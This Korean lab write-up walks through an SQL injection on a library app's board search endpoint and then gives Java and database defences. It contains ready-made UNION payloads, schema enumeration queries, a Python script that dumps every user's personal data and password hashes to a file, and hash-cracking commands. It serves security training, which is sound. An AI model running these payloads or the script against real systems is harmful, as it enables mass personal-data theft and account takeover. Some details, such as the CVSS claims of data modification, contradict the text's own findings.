# 공격 시나리오 2: SQL Injection을 통한 개인정보 유출

## 개요

**취약점 유형**: SQL Injection (CWE-89)
**공격 목표**: 게시판 검색 기능을 악용하여 모든 사용자의 개인정보 탈취
**영향도**: Critical (CVSS 9.8)

**공격 체인**:
1. 게시판 검색 기능에서 SQL Injection 취약점 발견
2. UNION 기반 SQL Injection으로 user 테이블 접근
3. 모든 사용자의 개인정보(이름, 이메일, 전화번호, 주소, 비밀번호 해시) 탈취
4. 탈취한 비밀번호 해시를 크래킹하여 계정 탈취

---

## 1단계: 정보 수집 (Reconnaissance)

### 1.1 게시판 검색 기능 발견

공격자는 블랙박스 환경에서 애플리케이션을 탐색하다가 게시판에 검색 기능이 있음을 발견합니다.

**검색 기능 위치**: http://kirbylib.duckdns.org/board.html

검색창에 일반적인 키워드를 입력하면:
```
검색어: 도서
```

브라우저 개발자 도구(F12 → Network 탭)에서 다음 요청이 관찰됩니다:
```
GET /api/board/search?keyword=도서
```

응답:
```json
{
  "success": true,
  "keyword": "도서",
  "results": [
    {
      "boardId": 5,
      "title": "도서 추천 부탁드립니다",
      "content": "재밌는 소설 추천해주세요",
      "username": "user123",
      "email": "user123@example.com",
      "phone": "010-1234-5678",
      "addr": "서울시 강남구"
    }
  ],
  "count": 1
}
```

**중요 관찰사항**:
- 검색 결과에 사용자의 **개인정보(email, phone, addr)**가 포함되어 있음
- URL 파라미터로 검색어가 전달됨 (SQL Injection 테스트 가능)

---

## 2단계: 취약점 탐지 (Vulnerability Detection)

### 2.1 SQL Injection 테스트

공격자는 SQL 메타문자를 삽입하여 SQL Injection 여부를 테스트합니다.

**테스트 1: 작은따옴표(') 삽입**
```
검색어: test'
```

요청:
```
GET /api/board/search?keyword=test'
```

응답:
```json
{
  "success": false,
  "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''test''' at line 1",
  "errorType": "java.sql.SQLSyntaxErrorException",
  "sql_hint": "Check your SQL syntax near: test'"
}
```

**결과**: SQL 에러 메시지가 그대로 노출됨 → **SQL Injection 취약점 확인**

**취약점 분석**:
1. SQL 에러가 상세히 노출되어 데이터베이스 구조 파악 가능
2. 입력값이 SQL 쿼리에 직접 삽입되고 있음 (Prepared Statement 미사용)
3. MySQL 데이터베이스 사용 확인

### 2.2 True/False 조건 테스트

**테스트 2: 항상 참인 조건**
```
검색어: ' OR '1'='1
```

요청:
```
GET /api/board/search?keyword=%27%20OR%20%271%27%3D%271
```

실행되는 SQL (추정):
```sql
SELECT b.board_id, b.title, b.content, b.category, b.created_at,
       u.username, u.email, u.phone, u.addr
FROM board b
LEFT JOIN user u ON b.user_id = u.user_id
WHERE b.title LIKE '%' OR '1'='1%'
   OR b.content LIKE '%' OR '1'='1%'
ORDER BY b.board_id DESC
```

응답: **모든 게시글이 반환됨** (조건이 항상 참이 되어 WHERE 절 우회)

---

## 3단계: 취약점 악용 (Exploitation)

### 3.1 컬럼 수 확인

UNION 공격을 위해 원본 쿼리의 컬럼 수를 확인합니다.

**테스트 3: ORDER BY를 이용한 컬럼 수 확인**

**주의:** MySQL 주석은 `#` 또는 `-- ` (공백 포함)를 사용해야 합니다.

```
검색어: test' ORDER BY 1#
검색어: test' ORDER BY 5#
검색어: test' ORDER BY 9#     (성공)
검색어: test' ORDER BY 10#    (에러 발생)
```

실행되는 SQL:
```sql
WHERE b.title LIKE '%test' ORDER BY 9#%'
```

`#` 뒤의 모든 내용이 주석 처리되어 원래 쿼리의 나머지 부분이 무시됩니다.

→ **컬럼 수: 9개**

### 3.2 데이터베이스 구조 파악 (information_schema 활용)

블랙박스 환경에서 테이블명과 컬럼명을 알아내야 합니다. MySQL의 **information_schema**를 활용합니다.

**3.2.1 컬럼 타입 파악 (시행착오)**

공격자는 원본 쿼리의 컬럼 타입을 모르므로, **에러 메시지**를 통해 학습합니다.

**시도 1: 모두 숫자로 테스트**
```
검색어: test' UNION SELECT 1,2,3,4,5,6,7,8,9#
```

에러:
```json
{
  "success": false,
  "error": "Cannot convert string '5' to java.sql.Timestamp value"
}
```

→ **5번째 컬럼이 Timestamp 타입임을 발견!**

**시도 2: NULL 사용 (모든 타입과 호환)**
```
검색어: test' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
```

→ **성공!** NULL은 모든 데이터 타입과 호환됩니다.

**3.2.2 현재 데이터베이스의 테이블 목록 조회**

이제 NULL을 사용하여 안전하게 데이터를 추출합니다.

**중요:** 프론트엔드는 `title` 컬럼만 화면에 표시하므로, table_name을 **2번째 컬럼 (title)**에 넣어야 합니다.

```
검색어: 0' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()#
```

**Tip:**
- `0'`로 시작하면 앞의 정상 쿼리 결과가 없어서 UNION 결과만 깔끔하게 보입니다.
- 또는 브라우저 개발자 도구(F12) → Network 탭 → Response에서 전체 JSON 데이터를 확인할 수 있습니다.

응답 (브라우저 F12 → Network → Response):
```json
{
  "success": true,
  "results": [
    {
      "boardId": null,
      "title": "board",
      "content": null,
      ...
    },
    {
      "boardId": null,
      "title": "users",
      "content": null,
      ...
    },
    {
      "boardId": null,
      "title": "book",
      "content": null,
      ...
    }
  ]
}
```

화면에는 "제목" 컬럼에 테이블명이 표시됩니다:
- board
- users
- book
- loan
- reservation

**발견한 테이블:**
- `board` (게시판)
- `users` (사용자) ← **타겟!**
- `book` (도서)
- `loan` (대출)
- `reservation` (예약)

**3.2.3 users 테이블의 컬럼 목록 조회**

**주의:** `table_name='users'`만 사용하면 다른 데이터베이스(mysql.users 등)의 컬럼도 함께 나올 수 있습니다.
**현재 데이터베이스만 필터링**하려면 `AND table_schema=database()`를 추가해야 합니다.

```
검색어: 0' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' AND table_schema=database()#
```

응답 (화면의 "제목" 컬럼에 표시됨):
- user_id
- username
- password_hash
- email
- phone
- addr
- points
- role
- created_at

**발견한 컬럼:**
- `user_id` - 사용자 ID
- `username` - 사용자명
- `password_hash` - 비밀번호 해시 (bcrypt) ← **중요!**
- `email` - 이메일
- `phone` - 전화번호
- `addr` - 주소
- `points` - 포인트
- `role` - 권한 (USER/ADMIN)
- `created_at` - 가입일

**3.2.4 컬럼 데이터 타입 확인 (선택사항)**

```
검색어: 0' UNION SELECT NULL,CONCAT(column_name,':',data_type),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' AND table_schema=database()#
```

응답 (화면의 "제목" 컬럼에 표시됨):
- user_id:bigint
- username:varchar
- password_hash:varchar
- email:varchar
- phone:varchar
- addr:varchar
- points:int
- role:varchar
- created_at:datetime

### 3.3 UNION SELECT로 users 테이블 데이터 추출

이제 테이블명과 컬럼명을 알았으니, UNION을 사용하여 users 테이블의 데이터를 직접 가져올 수 있습니다.

**공격 페이로드 1: 모든 사용자 정보 추출**
```
검색어: test' UNION SELECT user_id, username, email, phone, addr, password_hash, role, created_at, points FROM users#
```

URL 인코딩:
```
GET /api/board/search?keyword=test%27%20UNION%20SELECT%20user_id%2C%20username%2C%20email%2C%20phone%2C%20addr%2C%20password_hash%2C%20role%2C%20created_at%2C%20points%20FROM%20users%23
```

실행되는 SQL:
```sql
SELECT b.board_id, b.title, b.content, b.category, b.created_at,
       u.username, u.email, u.phone, u.addr
FROM board b
LEFT JOIN users u ON b.user_id = u.user_id
WHERE b.title LIKE '%test' UNION SELECT user_id, username, email, phone, addr, password_hash, role, created_at, points FROM users#%'
```

`#` 이후의 모든 내용이 주석 처리되어 `OR b.content LIKE ...`와 `ORDER BY`가 무시됩니다.
```

**예상 응답** (모든 사용자 정보):
```json
{
  "success": true,
  "keyword": "' UNION SELECT user_id, username, email, phone, addr, password_hash, role, created_at, points FROM users--",
  "results": [
    {
      "boardId": 1,
      "title": "admin",
      "content": "admin@kirby.com",
      "category": "010-0000-0000",
      "createdAt": "서울시 서초구",
      "username": "$2a$10$abcdefghijklmnopqrstuv",
      "email": "ADMIN",
      "phone": "2025-01-15 10:30:00",
      "addr": "999999"
    },
    {
      "boardId": 2,
      "title": "user123",
      "content": "user123@example.com",
      "category": "010-1234-5678",
      "createdAt": "서울시 강남구",
      "username": "$2a$10$zyxwvutsrqponmlkjihgf",
      "email": "USER",
      "phone": "2025-01-20 14:20:00",
      "addr": "5000"
    }
  ],
  "count": 10
}
```

**탈취된 정보**:
- `boardId` → user_id
- `title` → username
- `content` → email
- `category` → phone
- `createdAt` → addr
- `username` → **password_hash** (bcrypt 해시)
- `email` → role
- `phone` → created_at
- `addr` → points

### 3.4 관리자 계정 탈취

**공격 페이로드 2: 관리자만 필터링**
```
검색어: test' UNION SELECT user_id, username, email, phone, addr, password_hash, role, created_at, points FROM users WHERE role='ADMIN'#
```

응답에서 관리자의 비밀번호 해시를 획득:
```
username: admin
password_hash: $2a$10$abcdefghijklmnopqrstuv...
```

### 3.5 비밀번호 크래킹

획득한 bcrypt 해시를 **John the Ripper** 또는 **Hashcat**으로 크래킹 시도합니다.

**bcrypt는 단방향 해시라 복호화 불가능하지만, "무차별 대입 공격"으로 추측 가능합니다:**

#### 크래킹 원리

```python
# 개념적 예시
wordlist = ["password", "123456", "admin", "admin123", ...]

for guess in wordlist:
    if bcrypt.hashpw(guess) == stolen_hash:
        print(f"비밀번호 발견: {guess}")
        break
```

1. 단어 사전(rockyou.txt)에서 하나씩 추측
2. 각 추측값을 bcrypt로 해시
3. 탈취한 해시와 비교
4. 일치하면 성공!

#### John the Ripper 사용

```bash
# 관리자 비밀번호 해시 저장
echo '$2a$10$abcdefghijklmnopqrstuv...' > admin_hash.txt

# rockyou.txt 사전으로 크래킹 시도
john --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt

# 결과 확인
john --show admin_hash.txt
```

#### Hashcat 사용 (GPU 가속)

```bash
# -m 3200: bcrypt 모드
# GPU를 사용해 초당 수십만 번 시도
hashcat -m 3200 admin_hash.txt /usr/share/wordlists/rockyou.txt

# 진행 상황 확인
hashcat -m 3200 admin_hash.txt --show
```

#### 크래킹 성공률

| 비밀번호 | 크래킹 소요 시간 | 이유 |
|---------|---------------|------|
| `admin` | **1초** | rockyou.txt 상위권 |
| `password123` | **10초** | 매우 흔한 패턴 |
| `qwerty2024` | **수 분** | 흔한 패턴 변형 |
| `P@ssw0rd!` | **수 시간** | 복잡하지만 패턴 있음 |
| `g7$mK2#pQ9zL` | **수십 년** | 완전 랜덤 12자 |
| `g7$mK2#pQ9zL&3xT` | **사실상 불가능** | 랜덤 16자 이상 |

**결론:** 약한 비밀번호("admin123", "password" 등)는 **수 분 내에 크래킹 가능**합니다.

---

## 4단계: 데이터 조작 시도 (Stacked Query)

### 4.1 Stacked Query 테스트

일부 데이터베이스(MSSQL, PostgreSQL)는 세미콜론(;)으로 여러 SQL 문을 실행할 수 있습니다.

**공격 페이로드 3: 자신의 포인트를 999999로 변경 시도**
```
검색어: test'; UPDATE users SET points=999999 WHERE username='user123'#
```

의도한 SQL:
```sql
SELECT ... WHERE b.title LIKE '%test';
UPDATE users SET points=999999 WHERE username='user123'#%';
```

**결과 (MySQL/MariaDB):**
```json
{
  "success": false,
  "error": "You have an error in your SQL syntax; check the manual..."
}
```

**실패 이유:**
- MySQL/MariaDB는 기본적으로 **Stacked Query를 지원하지 않음**
- JDBC Driver가 여러 SQL 문 실행을 차단
- 이 취약점으로는 **데이터 조회만 가능, 수정은 불가능**

**Stacked Query가 가능한 경우:**
- MSSQL (Microsoft SQL Server)
- PostgreSQL (특정 드라이버)
- SQLite

**현재 시나리오에서 가능한 공격:**
- ✅ 데이터 조회 (SELECT)
- ✅ 개인정보 탈취
- ✅ 비밀번호 해시 유출
- ❌ 데이터 수정 (UPDATE, DELETE)
- ❌ 관리자 권한 변경

---

## 5단계: 자동화 스크립트

공격자는 Python 스크립트를 작성하여 모든 사용자 정보를 자동으로 추출할 수 있습니다.

### SQLi 자동 추출 스크립트

```python
import requests
import urllib.parse

TARGET = "http://kirbylib.duckdns.org"

# SQL Injection 페이로드
payload = "test' UNION SELECT user_id, username, email, phone, addr, password_hash, role, created_at, points FROM users#"
encoded_payload = urllib.parse.quote(payload)

url = f"{TARGET}/api/board/search?keyword={encoded_payload}"

response = requests.get(url)
data = response.json()

if data.get("success"):
    print(f"[+] {len(data['results'])}명의 사용자 정보 탈취 성공!\n")

    with open("stolen_users.txt", "w", encoding="utf-8") as f:
        for user in data["results"]:
            print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f"User ID: {user['boardId']}")
            print(f"Username: {user['title']}")
            print(f"Email: {user['content']}")
            print(f"Phone: {user['category']}")
            print(f"Address: {user['createdAt']}")
            print(f"Password Hash: {user['username']}")
            print(f"Role: {user['email']}")
            print(f"Points: {user['addr']}")

            # 파일에 저장
            f.write(f"Username: {user['title']}\n")
            f.write(f"Email: {user['content']}\n")
            f.write(f"Phone: {user['category']}\n")
            f.write(f"Address: {user['createdAt']}\n")
            f.write(f"Password Hash: {user['username']}\n")
            f.write(f"Role: {user['email']}\n")
            f.write(f"Points: {user['addr']}\n")
            f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

    print(f"\n[+] 모든 정보가 'stolen_users.txt'에 저장되었습니다.")
else:
    print("[-] 공격 실패")
    print(data)
```

실행:
```bash
python3 sqli_exploit.py
```

출력:
```
[+] 25명의 사용자 정보 탈취 성공!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
User ID: 1
Username: admin
Email: admin@kirby.com
Phone: 010-0000-0000
Address: 서울시 서초구
Password Hash: $2a$10$abcdefghijklmnopqrstuv...
Role: ADMIN
Points: 999999
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
...

[+] 모든 정보가 'stolen_users.txt'에 저장되었습니다.
```

---

## Burp Suite를 활용한 공격

### Burp Suite Repeater 사용

1. Burp Suite 실행 및 프록시 설정
2. 브라우저에서 정상적인 검색 수행
3. Burp Suite Proxy → HTTP History에서 `/api/board/search` 요청 찾기
4. 우클릭 → "Send to Repeater"
5. Repeater 탭에서 `keyword` 파라미터 수정:

```http
GET /api/board/search?keyword=%27%20UNION%20SELECT%20user_id%2C%20username%2C%20email%2C%20phone%2C%20addr%2C%20password_hash%2C%20role%2C%20created_at%2C%20points%20FROM%20users-- HTTP/1.1
Host: kirbylib.duckdns.org
User-Agent: Mozilla/5.0
Accept: application/json
Cookie: JSESSIONID=...
```

6. "Send" 클릭하여 응답 확인
7. Response 탭에서 모든 사용자 정보 확인

### Burp Suite Intruder로 테이블/컬럼명 추측

데이터베이스 스키마를 모르는 경우, Intruder를 사용하여 테이블명과 컬럼명을 추측할 수 있습니다.

**Payload Positions**:
```
GET /api/board/search?keyword=' UNION SELECT 1,§table_name§,3,4,5,6,7,8,9 FROM information_schema.tables WHERE table_schema=database()--
```

**Payload List**:
```
users
members
accounts
customers
...
```

올바른 테이블명을 찾으면 다시 Intruder로 컬럼명을 추측합니다.

---

## 영향도 분석

### 심각도: Critical (CVSS 9.8)

**CVSS 벡터**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

| 항목 | 값 | 설명 |
|------|------|------|
| Attack Vector (AV) | Network (N) | 인터넷을 통해 원격 공격 가능 |
| Attack Complexity (AC) | Low (L) | 특별한 조건 없이 공격 가능 |
| Privileges Required (PR) | None (N) | 인증 불필요 (익명 사용자도 공격 가능) |
| User Interaction (UI) | None (N) | 사용자 개입 불필요 |
| Scope (S) | Unchanged (U) | 취약점의 영향이 동일 보안 권한 내에 제한됨 |
| Confidentiality (C) | High (H) | 모든 사용자 개인정보 유출 |
| Integrity (I) | High (H) | 데이터베이스 수정 가능 (UPDATE, DELETE) |
| Availability (A) | High (H) | 데이터베이스 삭제 가능 (DROP TABLE) |

### 실제 피해 사례

1. **개인정보 전체 유출**: 모든 사용자의 이름, 이메일, 전화번호, 주소 탈취
2. **비밀번호 해시 유출**: 약한 비밀번호 사용 시 계정 탈취 가능
3. **관리자 계정 탈취**: 관리자 권한 획득 시 시스템 완전 장악
4. **포인트 무제한 조작**: 문화상품권 무제한 발급
5. **게시글 전체 삭제**: `DROP TABLE board` 실행 가능
6. **데이터베이스 파괴**: `DROP DATABASE` 실행 가능

---

## 방어 대책

### 1. Prepared Statement 사용 (필수)

**취약한 코드** (BoardController.java:214-221):
```java
// 🚨 취약점: 사용자 입력을 직접 SQL에 삽입
String sql = "SELECT b.board_id, b.title, b.content, b.category, b.created_at, " +
            "u.username, u.email, u.phone, u.addr " +
            "FROM board b " +
            "LEFT JOIN user u ON b.user_id = u.user_id " +
            "WHERE b.title LIKE '%" + keyword + "%' " +
            "OR b.content LIKE '%" + keyword + "%' " +
            "ORDER BY b.board_id DESC";
```

**안전한 코드**:
```java
String sql = "SELECT b.board_id, b.title, b.content, b.category, b.created_at, " +
            "u.username " +  // 개인정보 제거
            "FROM board b " +
            "LEFT JOIN user u ON b.user_id = u.user_id " +
            "WHERE b.title LIKE ? " +
            "OR b.content LIKE ? " +
            "ORDER BY b.board_id DESC";

PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, "%" + keyword + "%");
pstmt.setString(2, "%" + keyword + "%");
ResultSet rs = pstmt.executeQuery();
```

### 2. Spring Data JPA 사용 (가장 권장)

Spring Data JPA를 사용하면 SQL Injection을 **원천 차단**할 수 있습니다.

#### 방법 1: 메서드명 쿼리 (가장 안전, 실무 60%)

```java
@Repository
public interface BoardRepository extends JpaRepository<Board, Long> {

    // 메서드명만으로 쿼리 자동 생성 - SQL 직접 작성 안 함!
    List<Board> findByTitleContainingOrContentContaining(String title, String content);
}

// 사용
List<Board> results = boardRepository.findByTitleContainingOrContentContaining(keyword, keyword);
```

**안전한 이유:**
- Spring Data JPA가 메서드명을 파싱해서 **자동으로 Prepared Statement 생성**
- 개발자가 SQL을 직접 작성하지 않음
- SQL Injection 원천 차단

**JPA가 생성하는 실제 SQL:**
```sql
-- Prepared Statement로 자동 변환
SELECT * FROM board
WHERE title LIKE ? OR content LIKE ?

-- 파라미터 바인딩
pstmt.setString(1, "%keyword%");
pstmt.setString(2, "%keyword%");
```

#### 방법 2: @Query 사용 (복잡한 쿼리, 실무 30%)

```java
@Repository
public interface BoardRepository extends JpaRepository<Board, Long> {

    // JPQL - 엔티티 기반 쿼리
    @Query("SELECT b FROM Board b " +
           "LEFT JOIN FETCH b.user u " +
           "WHERE b.title LIKE %:keyword% OR b.content LIKE %:keyword% " +
           "ORDER BY b.boardId DESC")
    List<Board> searchBoards(@Param("keyword") String keyword);

    // DTO 프로젝션 (필요한 컬럼만 조회)
    @Query("SELECT new com.example.dto.BoardResponse(" +
           "b.boardId, b.title, b.category, b.createdAt, u.username) " +
           "FROM Board b LEFT JOIN b.user u " +
           "WHERE b.title LIKE %:keyword% OR b.content LIKE %:keyword%")
    List<BoardResponse> searchBoardsDto(@Param("keyword") String keyword);
}
```

**안전한 이유:**
- `:keyword`는 **named parameter** - 자동으로 Prepared Statement 변환
- JPQL은 **엔티티 기반**이라 SQL 구조를 바꿀 수 없음
- 사용자 입력이 SQL 구조에 영향을 줄 수 없음

**사용자가 `' OR '1'='1` 입력 시:**
```java
searchBoards("' OR '1'='1");

// 실행되는 SQL
WHERE b.title LIKE %?' OR '1'='1% OR b.content LIKE %?' OR '1'='1%
                      ↑ 문자열로 취급됨 (SQL 구조 변경 안 됨)
```

#### 방법 3: QueryDSL (동적 쿼리, 실무 5%)

```java
@Repository
@RequiredArgsConstructor
public class BoardRepositoryImpl {
    private final JPAQueryFactory queryFactory;

    public List<Board> searchBoards(String keyword) {
        return queryFactory
            .selectFrom(board)
            .leftJoin(board.user, user).fetchJoin()
            .where(
                board.title.contains(keyword)
                .or(board.content.contains(keyword))
            )
            .orderBy(board.boardId.desc())
            .fetch();
    }
}
```

**안전한 이유:**
- Type-safe한 쿼리 작성
- 자동으로 Prepared Statement 생성
- 컴파일 타임에 오류 검출

### 3. 입력값 검증 및 필터링

```java
// 특수문자 필터링
if (keyword.matches(".*[';\"\\-\\\\].*")) {
    return ResponseEntity.badRequest()
        .body(Map.of("error", "허용되지 않는 문자가 포함되어 있습니다."));
}

// 길이 제한
if (keyword.length() > 50) {
    return ResponseEntity.badRequest()
        .body(Map.of("error", "검색어가 너무 깁니다."));
}
```

### 4. 최소 권한 원칙

데이터베이스 계정에 최소한의 권한만 부여:

```sql
-- 애플리케이션용 계정은 SELECT, INSERT, UPDATE만 허용
GRANT SELECT, INSERT, UPDATE ON kirby_library.* TO 'app_user'@'localhost';

-- DROP, CREATE 등 DDL 권한 제거
REVOKE CREATE, DROP, ALTER ON *.* FROM 'app_user'@'localhost';
```

### 5. 에러 메시지 숨김

**취약한 코드** (BoardController.java:247-252):
```java
catch (Exception e) {
    response.put("success", false);
    response.put("error", e.getMessage());  // 🚨 SQL 에러 노출
    response.put("errorType", e.getClass().getName());
    response.put("sql_hint", "Check your SQL syntax near: " + keyword);
}
```

**안전한 코드**:
```java
catch (Exception e) {
    logger.error("Search error: ", e);  // 서버 로그에만 기록
    response.put("success", false);
    response.put("error", "검색 중 오류가 발생했습니다.");  // 일반적인 메시지만 반환
}
```

### 6. 민감 정보 노출 방지

검색 결과에서 개인정보(email, phone, addr) 제거:

```java
// username만 포함, 개인정보는 제외
board.put("username", rs.getString("username"));
// board.put("email", rs.getString("email"));  // 제거
// board.put("phone", rs.getString("phone"));  // 제거
// board.put("addr", rs.getString("addr"));     // 제거
```

### 7. WAF(Web Application Firewall) 적용

AWS WAF 또는 ModSecurity를 사용하여 SQL Injection 패턴 차단:

```
# ModSecurity 규칙 예시
SecRule ARGS "@rx (?i:(union|select|insert|update|delete|drop|create|alter))" \
    "id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"
```

---

## 실습 가이드

### 실습 환경

- 타겟: http://kirbylib.duckdns.org
- 취약한 엔드포인트: `/api/board/search?keyword={검색어}`
- 필요 도구: 브라우저 개발자 도구, Burp Suite, Python

### 실습 순서

1. **기본 검색 테스트**
   - 정상적인 검색어 입력: "도서"
   - 응답에서 개인정보(email, phone) 노출 확인

2. **SQL Injection 탐지**
   - 작은따옴표 입력: `'`
   - SQL 에러 메시지 확인

3. **True/False 조건 테스트**
   - `' OR '1'='1` 입력
   - 모든 게시글이 반환되는지 확인

4. **컬럼 수 확인**
   - `test' ORDER BY 9#` 입력 (성공)
   - `test' ORDER BY 10#` 입력 (실패)
   - 컬럼 수: 9개 확인

5. **컬럼 타입 파악**
   - `test' UNION SELECT 1,2,3,4,5,6,7,8,9#` 입력
   - 에러 발생: "Cannot convert string '5' to java.sql.Timestamp value"
   - 5번째 컬럼이 Timestamp임을 발견
   - `test' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#` 입력 (성공)

6. **데이터베이스 구조 파악**
   - `0' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()#` 입력
   - 화면의 "제목" 컬럼에 테이블명 표시: board, users, book, loan, reservation
   - `0' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'#` 입력
   - 화면의 "제목" 컬럼에 컬럼명 표시: user_id, username, password_hash, email, phone, addr, points, role, created_at

7. **UNION 공격**
   - `test' UNION SELECT user_id, username, email, phone, addr, password_hash, role, created_at, points FROM users#` 입력
   - 모든 사용자 정보 탈취

8. **자동화 스크립트 실행**
   - Python 스크립트로 데이터 자동 추출
   - 결과를 파일로 저장

---

## 법적 고지

이 문서는 **교육 목적**으로만 작성되었습니다.

- 본인이 소유하거나 명시적 승인을 받은 시스템에서만 테스트하세요
- 무단으로 타인의 시스템을 공격하는 것은 **형법 제48조의2(정보통신망 침해죄)** 위반입니다
- 위반 시 **7년 이하의 징역 또는 7천만원 이하의 벌금**에 처해질 수 있습니다

---

## 참고 자료

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: SQL Injection: https://cwe.mitre.org/data/definitions/89.html
- PortSwigger SQL Injection Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- OWASP Top 10 2021 - A03:Injection: https://owasp.org/Top10/A03_2021-Injection/

---

**작성일**: 2025-01-26
**버전**: 1.0
**작성자**: KIRBY 보안팀
